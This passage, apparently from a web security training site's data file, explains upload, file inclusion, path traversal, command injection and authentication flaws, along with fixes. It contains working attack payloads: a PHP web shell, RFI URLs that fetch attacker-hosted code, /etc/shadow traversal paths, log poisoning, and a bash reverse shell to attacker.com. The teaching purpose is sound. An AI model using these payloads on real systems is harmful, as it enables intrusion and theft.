        <p>This vulnerability commonly appears in upload features such as profile pictures, attachments, documents, media files, or administrative panels.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-uploaded files without performing proper validation on file type, extension, content, or storage location.</p>

        <h3>Common Weak Validation Methods:</h3>

        <pre><code>Checking file extension only

Checking MIME type only

Blacklisting dangerous extensions

Trusting client-side validation</code></pre>

        <h3>Dangerous File Types:</h3>

        <pre><code>.php
.jsp
.asp
.aspx
.cgi
.py
.pl</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

move_uploaded_file(
    $_FILES['file']['tmp_name'],
    "uploads/" . $_FILES['file']['name']
);</code></pre>

        <p>The application uploads the file directly without validation.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>shell.php</code></pre>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>If the file is uploaded successfully, the attacker may execute commands using:</p>

        <pre><code>http://target.com/uploads/shell.php?cmd=whoami</code></pre>

        <h3>Why is File Upload Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute remote commands, upload web shells, bypass authentication, steal sensitive files, or fully take control of the server.</p>

        <h3>Common Upload Bypass Techniques:</h3>

        <pre><code>shell.php.jpg

shell.phtml

shell.php%00.jpg

shell.php....

shell.php;.jpg</code></pre>

        <h3>MIME Type Bypass:</h3>

        <p>Some applications only verify the MIME type sent by the browser.</p>

        <pre><code>Content-Type: image/jpeg</code></pre>

        <p>An attacker can modify the request manually using Burp Suite.</p>

        <h3>Double Extension Bypass:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <p>Some servers may still execute the file as PHP depending on server configuration.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>shell.php%00.jpg</code></pre>

        <p>Older systems may stop processing the filename after the null byte.</p>

        <h3>Image-Based Payloads:</h3>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>The attacker hides malicious code inside image files.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution (RCE).</p>
        <p>2. Uploading Web Shells.</p>
        <p>3. Defacing websites.</p>
        <p>4. Stealing sensitive data.</p>
        <p>5. Gaining persistent access.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg</code></pre>

        <h3>Common Web Shells:</h3>

        <pre><code>C99 Shell
WSO Shell
b374k
China Chopper</code></pre>

        <h3>Indicators of File Upload Vulnerability:</h3>

        <p>1. Missing file extension validation.</p>
        <p>2. Upload directory accessible publicly.</p>
        <p>3. Uploaded files execute as scripts.</p>
        <p>4. Weak MIME type verification.</p>
        <p>5. No file content inspection.</p>

        <h3>Dangerous Upload Locations:</h3>

        <pre><code>/uploads/
/images/
/avatars/
/files/</code></pre>

        <h3>Example of Weak Blacklist Filtering:</h3>

        <pre><code>if(filename != ".php")</code></pre>

        <p>Attackers can bypass weak blacklist filters using alternative extensions.</p>

        <h3>Safe Validation Example:</h3>

        <pre><code>// Secure Example

Allow only specific extensions

Verify MIME type

Validate file signatures

Rename uploaded files

Store files outside web root</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use whitelist validation instead of blacklist validation.</b></p>

        <p><b>2. Verify file signatures and content.</b></p>

        <p><b>3. Rename uploaded files randomly.</b></p>

        <p><b>4. Store uploaded files outside the web root.</b></p>

        <p><b>5. Disable script execution inside upload directories.</b></p>

        <p><b>6. Restrict file permissions.</b></p>

        <p><b>7. Limit file size and upload types.</b></p>

        <h3>Common Security Configurations:</h3>

        <pre><code>Disable PHP execution in uploads/

Use separate file servers

Apply Content Security Policy (CSP)

Scan uploads using antivirus solutions</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Safe and Unsafe Uploads:</h3>

        <p><b>Unsafe Upload:</b> The application stores user files directly and allows script execution.</p>

        <p><b>Safe Upload:</b> The application validates, sanitizes, renames, and securely stores uploaded files.</p>

        <h3>Vulnerability Severity:</h3>

        <p>File Upload Vulnerability is extremely critical because a successful attack may lead to full server compromise, remote command execution, malware deployment, data theft, or complete website takeover.</p>
    `
},

{
    "id": 13,
    "title": "Remote File Inclusion (RFI)",
    "summary": `
        <p><b>Remote File Inclusion (RFI)</b> is a critical web vulnerability that allows attackers to include and execute remote files on a vulnerable server. This vulnerability commonly affects web applications that dynamically load files without properly validating user input.</p>

        <p>RFI vulnerabilities are especially dangerous because they may lead to Remote Code Execution (RCE), server compromise, web shell uploads, or complete control over the target system.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-controlled input and directly includes files from external sources without proper validation.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>The application directly includes files based on user input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt</code></pre>

        <p>If remote file inclusion is enabled, the server will fetch and execute the remote file.</p>

        <h3>Example of a Malicious Remote File:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <h3>Executing Commands:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=whoami</code></pre>

        <p>The attacker may execute operating system commands on the vulnerable server.</p>

        <h3>Why is RFI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to upload web shells, execute remote commands, steal sensitive files, gain persistent access, or completely compromise the target server.</p>

        <h3>Requirements for RFI Exploitation:</h3>

        <pre><code>allow_url_include = On

allow_url_fopen = On</code></pre>

        <p>These PHP configurations allow remote files to be included from external URLs.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution (RCE).</p>
        <p>2. Uploading Web Shells.</p>
        <p>3. Stealing sensitive data.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Full server takeover.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /index.php?page=http://attacker.com/shell.txt HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Payloads:</h3>

        <pre><code>http://attacker.com/shell.txt

https://evil.com/malicious.php

ftp://attacker.com/backdoor.txt</code></pre>

        <h3>Difference Between RFI and LFI:</h3>

        <p><b>RFI:</b> Includes remote files hosted on external servers.</p>

        <p><b>LFI:</b> Includes local files stored on the target server itself.</p>

        <h3>Example of Weak Filtering:</h3>

        <pre><code>if(page != "http://")</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative protocols.</p>

        <h3>Protocol Wrapper Exploitation:</h3>

        <pre><code>php://input

data://

zip://</code></pre>

        <p>Attackers may abuse PHP wrappers to bypass restrictions or execute malicious code.</p>

        <h3>Common Indicators of RFI:</h3>

        <p>1. Dynamic file inclusion using user input.</p>
        <p>2. URL parameters controlling included files.</p>
        <p>3. Error messages related to include() or require().</p>
        <p>4. PHP warnings exposing file paths.</p>

        <h3>Testing for RFI:</h3>

        <pre><code>?page=http://example.com/test.txt</code></pre>

        <p>If the external content appears inside the application response, the application may be vulnerable.</p>

        <h3>Safe Example:</h3>

        <pre><code>// Secure Example

$pages = [
    "home" => "home.php",
    "about" => "about.php"
];

include($pages[$_GET['page']]);</code></pre>

        <p>The application uses a strict whitelist instead of direct user input.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Disable allow_url_include.</b></p>

        <p><b>2. Avoid direct file inclusion using user input.</b></p>

        <p><b>3. Use strict whitelist validation.</b></p>

        <p><b>4. Restrict accessible directories.</b></p>

        <p><b>5. Sanitize and validate all input.</b></p>

        <p><b>6. Disable dangerous PHP wrappers when unnecessary.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Disable remote includes

Use least privilege permissions

Monitor server logs

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may install malware, create backdoors, steal databases, pivot into internal networks, or completely destroy application integrity.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Remote File Inclusion is considered highly critical because it may directly lead to Remote Code Execution and full server compromise, especially on poorly configured PHP applications.</p>
    `
},

{
    "id": 14,
    "title": "Local File Inclusion (LFI)",
    "summary": `
        <p><b>Local File Inclusion (LFI)</b> is a dangerous web vulnerability that allows attackers to include and read files stored locally on the target server. This vulnerability usually occurs when web applications dynamically load files based on user input without proper validation.</p>

        <p>LFI vulnerabilities may lead to sensitive information disclosure, source code exposure, log poisoning, remote code execution, or complete server compromise under certain conditions.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-controlled input and directly includes local files without validating the requested path.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>The application includes files directly from user input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?page=../../../../etc/passwd</code></pre>

        <p>The attacker attempts to read sensitive system files using directory traversal.</p>

        <h3>Common Sensitive Files:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:\\Windows\\win.ini
C:\\boot.ini</code></pre>

        <h3>Why is LFI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read sensitive configuration files, obtain credentials, expose application source code, or even execute code using advanced exploitation techniques.</p>

        <h3>Directory Traversal Technique:</h3>

        <pre><code>../../../../</code></pre>

        <p>Attackers use directory traversal sequences to move outside the intended directory.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. Accessing configuration files.</p>
        <p>3. Extracting credentials.</p>
        <p>4. Source code disclosure.</p>
        <p>5. Achieving Remote Code Execution.</p>

        <h3>Log Poisoning Technique:</h3>

        <p>Attackers may inject PHP code into log files and later include them through the LFI vulnerability.</p>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <h3>Example of Log Poisoning:</h3>

        <pre><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>The attacker later accesses:</p>

        <pre><code>http://target.com/index.php?page=/var/log/apache2/access.log&cmd=whoami</code></pre>

        <h3>PHP Wrappers Exploitation:</h3>

        <pre><code>php://filter

php://input

data://</code></pre>

        <p>PHP wrappers may help attackers read source code or execute malicious input.</p>

        <h3>Reading Source Code:</h3>

        <pre><code>php://filter/convert.base64-encode/resource=index.php</code></pre>

        <p>The application source code may be displayed in Base64 format.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00</code></pre>

        <p>Older systems may truncate the filename after the null byte.</p>

        <h3>Common Indicators of LFI:</h3>

        <p>1. Dynamic file inclusion parameters.</p>
        <p>2. Error messages exposing file paths.</p>
        <p>3. URL parameters controlling file loading.</p>
        <p>4. Inclusion of local templates or pages.</p>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("../", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative traversal patterns.</p>

        <h3>Common Bypass Techniques:</h3>

        <pre><code>....//

..%2f

%252e%252e%252f</code></pre>

        <h3>Safe Example:</h3>

        <pre><code>// Secure Example

$pages = [
    "home" => "home.php",
    "about" => "about.php"
];

include($pages[$_GET['page']]);</code></pre>

        <p>The application uses a strict whitelist instead of direct user input.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct file inclusion from user input.</b></p>

        <p><b>2. Use whitelist validation.</b></p>

        <p><b>3. Restrict accessible directories.</b></p>

        <p><b>4. Sanitize and validate all paths.</b></p>

        <p><b>5. Disable unnecessary PHP wrappers.</b></p>

        <p><b>6. Restrict file permissions.</b></p>

        <p><b>7. Hide detailed error messages.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use least privilege permissions

Disable dangerous functions

Monitor logs continuously

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between LFI and RFI:</h3>

        <p><b>LFI:</b> Includes local files already stored on the target server.</p>

        <p><b>RFI:</b> Includes remote files hosted on external servers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive credentials, access application secrets, execute malicious code, compromise servers, or pivot deeper into internal infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Local File Inclusion is highly critical because it may expose sensitive system files and, in advanced exploitation scenarios, lead to Remote Code Execution and complete server compromise.</p>
    `
},


{
    "id": 15,
    "title": "Directory Traversal Attack",
    "summary": `
        <p><b>Directory Traversal Attack</b>, also known as <b>Path Traversal</b>, is a dangerous web vulnerability that allows attackers to access files and directories outside the intended web application directory.</p>

        <p>This vulnerability occurs when applications use user-controlled input to access files on the server without properly validating or sanitizing the requested path.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when an application directly uses user input in file paths.</p>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$file = $_GET['file'];

include("pages/" . $file);</code></pre>

        <p>The application assumes the user will only request files from the pages directory.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?file=../../../../etc/passwd</code></pre>

        <p>The attacker escapes the intended directory and accesses sensitive system files.</p>

        <h3>Common Traversal Sequences:</h3>

        <pre><code>../

..\\

....//

..%2f

%252e%252e%252f</code></pre>

        <h3>Why is Directory Traversal Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read configuration files, access credentials, expose source code, retrieve sensitive logs, or gain information useful for further attacks.</p>

        <h3>Common Sensitive Files:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:\\Windows\\win.ini
C:\\boot.ini</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /download?file=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Directory Traversal on Windows:</h3>

        <pre><code>..\\..\\..\\Windows\\win.ini</code></pre>

        <p>Windows systems may use backslashes instead of forward slashes.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. Accessing configuration files.</p>
        <p>3. Extracting credentials.</p>
        <p>4. Source code disclosure.</p>
        <p>5. Gathering information for further exploitation.</p>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("../", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative traversal patterns.</p>

        <h3>Encoding Bypass Techniques:</h3>

        <pre><code>..%2f

%2e%2e%2f

%252e%252e%252f</code></pre>

        <h3>Double Traversal Bypass:</h3>

        <pre><code>....//....//etc/passwd</code></pre>

        <p>Some filters fail to detect modified traversal patterns.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00</code></pre>

        <p>Older systems may stop processing the path after the null byte.</p>

        <h3>Indicators of Directory Traversal:</h3>

        <p>1. File download functionality.</p>
        <p>2. Dynamic file loading.</p>
        <p>3. URL parameters controlling file paths.</p>
        <p>4. Error messages exposing server paths.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>File download systems

Template loaders

Image viewers

Log viewers

Backup download pages</code></pre>

        <h3>Example of Secure Validation:</h3>

        <pre><code>// Secure Example

$allowed = [
    "home.html",
    "about.html"
];

if(in_array($file, $allowed)) {
    include($file);
}</code></pre>

        <p>The application uses strict whitelist validation.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use whitelist validation for file access.</b></p>

        <p><b>2. Sanitize and validate all user input.</b></p>

        <p><b>3. Restrict access to sensitive directories.</b></p>

        <p><b>4. Avoid direct file path usage from user input.</b></p>

        <p><b>5. Normalize file paths before processing.</b></p>

        <p><b>6. Hide detailed server error messages.</b></p>

        <p><b>7. Apply least privilege permissions.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict filesystem permissions

Disable directory listing

Use chroot jails

Monitor server logs

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Directory Traversal and LFI:</h3>

        <p><b>Directory Traversal:</b> Focuses on accessing unauthorized files through path manipulation.</p>

        <p><b>LFI:</b> Focuses on including local files into application execution.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may expose passwords, database credentials, application secrets, source code, or internal server information that can lead to deeper compromise.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Directory Traversal is considered highly dangerous because it may expose critical system files and sensitive application data, potentially leading to complete server compromise when combined with other vulnerabilities.</p>
    `
},


{
    "id": 16,
    "title": "Linux Command Injection",
    "summary": `
        <p><b>Linux Command Injection</b> is a critical vulnerability that allows attackers to execute operating system commands on a Linux server through vulnerable applications.</p>

        <p>This vulnerability occurs when applications pass user-controlled input directly into system commands without proper sanitization or validation.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when an application constructs shell commands using unsafe user input.</p>

        <h3>Common Dangerous Functions:</h3>

        <pre><code>system()
exec()
shell_exec()
passthru()
popen()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$ip = $_GET['ip'];

system("ping -c 1 " . $ip);</code></pre>

        <p>The application directly inserts user input into a Linux command.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/ping.php?ip=127.0.0.1;whoami</code></pre>

        <p>The server executes both the ping command and the injected whoami command.</p>

        <h3>Common Command Separators:</h3>

        <pre><code>;
&&
||
|
$( )
\` \`</code></pre>

        <h3>Why is Command Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute arbitrary Linux commands, steal sensitive data, create backdoors, escalate privileges, or fully compromise the server.</p>

        <h3>Common Linux Commands Used by Attackers:</h3>

        <pre><code>whoami
id
uname -a
pwd
ls
cat /etc/passwd</code></pre>

        <h3>Example Using && Operator:</h3>

        <pre><code>127.0.0.1 && id</code></pre>

        <h3>Example Using Pipe Operator:</h3>

        <pre><code>127.0.0.1 | whoami</code></pre>

        <h3>Command Substitution Example:</h3>

        <pre><code>127.0.0.1$(whoami)</code></pre>

        <p>The shell executes the command inside the substitution syntax.</p>

        <h3>Blind Command Injection:</h3>

        <p>Sometimes command output is not visible directly in the response.</p>

        <pre><code>127.0.0.1; sleep 10</code></pre>

        <p>If the server response delays, the injection may be successful.</p>

        <h3>Out-of-Band Exploitation:</h3>

        <pre><code>127.0.0.1; nslookup attacker.com</code></pre>

        <p>The attacker monitors external DNS or HTTP requests to confirm code execution.</p>

        <h3>Reverse Shell Example:</h3>

        <pre><code>bash -i >& /dev/tcp/attacker.com/4444 0>&1</code></pre>

        <p>The attacker may gain interactive shell access to the server.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /ping.php?ip=127.0.0.1;id HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Command Execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Stealing sensitive files.</p>
        <p>4. Installing malware or backdoors.</p>
        <p>5. Full server compromise.</p>

        <h3>Indicators of Command Injection:</h3>

        <p>1. User input passed into shell commands.</p>
        <p>2. Unexpected command output in responses.</p>
        <p>3. Delayed server responses.</p>
        <p>4. Application interaction with system utilities.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Ping utilities

Traceroute tools

Backup systems

File conversion tools

Network diagnostic utilities</code></pre>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace(";", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using alternative separators or encoding techniques.</p>

        <h3>Bypass Techniques:</h3>

        <pre><code>&&
||
$(whoami)
\`id\`
%0a</code></pre>

        <h3>Example of Safe Code:</h3>

        <pre><code>// Secure Example

$ip = escapeshellarg($_GET['ip']);

system("ping -c 1 " . $ip);</code></pre>

        <p>The application sanitizes shell arguments before execution.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct shell command execution.</b></p>

        <p><b>2. Validate and sanitize all user input.</b></p>

        <p><b>3. Use safe APIs instead of shell commands.</b></p>

        <p><b>4. Apply least privilege permissions.</b></p>

        <p><b>5. Use escapeshellarg() and escaping mechanisms.</b></p>

        <p><b>6. Disable unnecessary system utilities.</b></p>

        <p><b>7. Monitor server logs for suspicious activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use containers or sandboxes

Restrict shell access

Disable dangerous functions

Apply Web Application Firewall (WAF)

Monitor process execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Commix
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Command Injection and Code Injection:</h3>

        <p><b>Command Injection:</b> Executes operating system commands.</p>

        <p><b>Code Injection:</b> Executes application-level code such as PHP or JavaScript.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive information, deploy ransomware, create persistent backdoors, move laterally through networks, or completely destroy system integrity.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Linux Command Injection is considered extremely critical because successful exploitation may directly lead to Remote Code Execution and full server compromise.</p>
    `
},


{
    "id": 17,
    "title": "OS Command Injection in Windows",
    "summary": `
        <p><b>OS Command Injection in Windows</b> is a critical vulnerability that allows attackers to execute Windows operating system commands through vulnerable applications.</p>

        <p>This vulnerability occurs when applications pass user-controlled input directly into Windows shell commands without proper validation or sanitization.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application builds system commands using unsafe user input.</p>

        <h3>Common Dangerous Functions:</h3>

        <pre><code>system()
exec()
shell_exec()
popen()
Runtime.exec()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$ip = $_GET['ip'];

system("ping " . $ip);</code></pre>

        <p>The application directly inserts user input into a Windows command.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/ping.php?ip=127.0.0.1 & whoami</code></pre>

        <p>The server executes both the ping command and the injected whoami command.</p>

        <h3>Common Windows Command Separators:</h3>

        <pre><code>&
&&
||
|</code></pre>

        <h3>Why is OS Command Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute arbitrary Windows commands, steal sensitive data, create backdoors, escalate privileges, or completely compromise the server.</p>

        <h3>Common Windows Commands Used by Attackers:</h3>

        <pre><code>whoami
ipconfig
dir
type
net user
tasklist</code></pre>

        <h3>Example Using && Operator:</h3>

        <pre><code>127.0.0.1 && dir</code></pre>

        <h3>Example Using Pipe Operator:</h3>

        <pre><code>127.0.0.1 | whoami</code></pre>

        <h3>Blind Command Injection:</h3>

        <p>Sometimes the application does not display command output directly.</p>

        <pre><code>127.0.0.1 & ping -n 10 127.0.0.1</code></pre>

        <p>If the response is delayed, the injection may be successful.</p>

        <h3>Out-of-Band Exploitation:</h3>

        <pre><code>127.0.0.1 & nslookup attacker.com</code></pre>

        <p>The attacker monitors external DNS requests to confirm code execution.</p>

        <h3>PowerShell Exploitation:</h3>

        <pre><code>powershell -c whoami</code></pre>

        <p>Attackers often abuse PowerShell to execute advanced commands.</p>

        <h3>Reverse Shell Example:</h3>

        <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass</code></pre>

        <p>The attacker may establish remote interactive access to the system.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /ping.php?ip=127.0.0.1 & whoami HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Command Execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Stealing sensitive files.</p>
        <p>4. Installing malware or ransomware.</p>
        <p>5. Full server compromise.</p>

        <h3>Indicators of OS Command Injection:</h3>

        <p>1. User input passed into system commands.</p>
        <p>2. Unexpected command output in responses.</p>
        <p>3. Delayed responses during testing.</p>
        <p>4. Application interaction with operating system utilities.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Ping utilities

Network diagnostic tools

Backup systems

File management tools

Administrative panels</code></pre>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("&", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using alternative separators or encoded payloads.</p>

        <h3>Common Bypass Techniques:</h3>

        <pre><code>&&
||
%0a
^
PowerShell payloads</code></pre>

        <h3>Example of Safe Code:</h3>

        <pre><code>// Secure Example

$ip = escapeshellarg($_GET['ip']);

system("ping " . $ip);</code></pre>

        <p>The application sanitizes shell arguments before execution.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct execution of system commands.</b></p>

        <p><b>2. Validate and sanitize all user input.</b></p>

        <p><b>3. Use safe APIs instead of shell execution.</b></p>

        <p><b>4. Apply least privilege permissions.</b></p>

        <p><b>5. Restrict PowerShell usage when unnecessary.</b></p>

        <p><b>6. Disable dangerous functions.</b></p>

        <p><b>7. Monitor logs for suspicious command execution.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict command execution

Use Windows Defender

Apply Application Whitelisting

Monitor PowerShell activity

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Commix
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Linux and Windows Command Injection:</h3>

        <p><b>Linux Injection:</b> Uses Linux shell commands and separators.</p>

        <p><b>Windows Injection:</b> Uses CMD or PowerShell commands and Windows-specific syntax.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may deploy malware, steal credentials, move laterally across networks, disable security controls, or completely compromise Windows servers.</p>

        <h3>Vulnerability Severity:</h3>

        <p>OS Command Injection in Windows is considered extremely critical because successful exploitation may directly lead to Remote Code Execution and complete system takeover.</p>
    `
},

{
    "id": 18,
    "title": "Broken Authentication Vulnerability",
    "summary": `
        <p><b>Broken Authentication</b> is a critical web application vulnerability that occurs when authentication mechanisms are implemented incorrectly, allowing attackers to compromise user accounts, bypass login systems, or gain unauthorized access.</p>

        <p>This vulnerability is one of the most dangerous security issues because authentication systems protect sensitive accounts, administrative panels, and confidential user data.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when authentication processes are weak, improperly configured, or fail to securely validate user identities.</p>

        <h3>Common Authentication Weaknesses:</h3>

        <pre><code>Weak passwords

Predictable session tokens

Missing rate limiting

Improper session management

Insecure password reset mechanisms</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// Weak Login Logic

if(username == "admin" && password == "admin") {
    login();
}</code></pre>

        <p>The application uses insecure and predictable credentials.</p>

        <h3>Brute Force Attack Example:</h3>

        <pre><code>admin:admin
admin:password
admin:123456</code></pre>

        <p>Attackers attempt multiple username and password combinations until successful authentication occurs.</p>

        <h3>Credential Stuffing Attack:</h3>

        <p>Attackers use leaked usernames and passwords obtained from previous data breaches.</p>

        <pre><code>user@example.com : password123</code></pre>

        <h3>Session Hijacking:</h3>

        <pre><code>Cookie: PHPSESSID=abc123</code></pre>

        <p>If attackers steal valid session cookies, they may impersonate authenticated users.</p>

        <h3>Why is Broken Authentication Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access sensitive accounts, steal confidential information, escalate privileges, or fully compromise the application.</p>

        <h3>Common Authentication Attacks:</h3>

        <p>1. Brute Force Attacks.</p>
        <p>2. Credential Stuffing.</p>
        <p>3. Session Hijacking.</p>
        <p>4. Password Spraying.</p>
        <p>5. Session Fixation.</p>

        <h3>Password Spraying Example:</h3>

        <pre><code>Password2024!
Welcome123
Company@123</code></pre>

        <p>Attackers try common passwords against many accounts to avoid lockout mechanisms.</p>

        <h3>Weak Session Token Example:</h3>

        <pre><code>SESSIONID=1001
SESSIONID=1002
SESSIONID=1003</code></pre>

        <p>Predictable session identifiers allow attackers to guess active sessions.</p>

        <h3>Insecure Password Reset Example:</h3>

        <pre><code>http://target.com/reset?token=12345</code></pre>

        <p>Weak reset tokens may allow attackers to reset user passwords.</p>

        <h3>Missing Rate Limiting:</h3>

        <p>If the application does not restrict repeated login attempts, attackers can automate brute force attacks.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin&password=admin</code></pre>

        <h3>Indicators of Broken Authentication:</h3>

        <p>1. Weak password policies.</p>
        <p>2. Predictable session IDs.</p>
        <p>3. Missing account lockout.</p>
        <p>4. Insecure password reset functionality.</p>
        <p>5. Session tokens exposed in URLs.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login forms

Password reset systems

Session management

Remember-me functionality

Single Sign-On systems</code></pre>

        <h3>Session Fixation Example:</h3>

        <pre><code>http://target.com/login?SESSIONID=attacker123</code></pre>

        <p>The attacker forces the victim to use a known session identifier.</p>

        <h3>Multi-Factor Authentication Bypass:</h3>

        <p>Weak MFA implementations may allow attackers to bypass additional authentication layers.</p>

        <h3>Example of Safe Authentication:</h3>

        <pre><code>// Secure Authentication

Use strong password hashing

Generate random session tokens

Enable MFA

Apply account lockout</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce strong password policies.</b></p>

        <p><b>2. Use Multi-Factor Authentication (MFA).</b></p>

        <p><b>3. Implement account lockout and rate limiting.</b></p>

        <p><b>4. Use secure random session identifiers.</b></p>

